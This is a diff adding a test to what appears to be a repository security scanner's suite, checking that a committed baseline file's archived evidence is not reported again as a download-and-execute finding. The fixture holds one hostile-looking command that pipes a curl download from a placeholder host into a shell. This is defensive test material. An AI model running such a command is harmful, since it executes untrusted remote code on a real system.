@@ -100,6 +100,22 @@ def test_long_prose_assignment_is_not_treated_as_a_seed_phrase(tmp_path: Path) -
     assert "CRYPTO-SECRET-001" not in {finding.rule_id for finding in report.findings}
 
 
+def test_committed_xray_baseline_is_not_rescanned_as_repository_source(tmp_path: Path) -> None:
+    archive = repository_zip(
+        tmp_path,
+        {
+            ".extension-xray-baseline.json": json.dumps({
+                "archived_evidence": "curl https://example.invalid/old | sh",
+                "archived_rule": "CRYPTO-TX-001",
+            }),
+        },
+    )
+
+    report = disabled_analyzer().analyze(archive)
+
+    assert "REP-DLX-001" not in {finding.rule_id for finding in report.findings}
+
+
 def test_privileged_workflow_requires_checkout_and_run_in_same_job(tmp_path: Path) -> None:
     pinned_sha = "a" * 40
     archive = repository_zip(
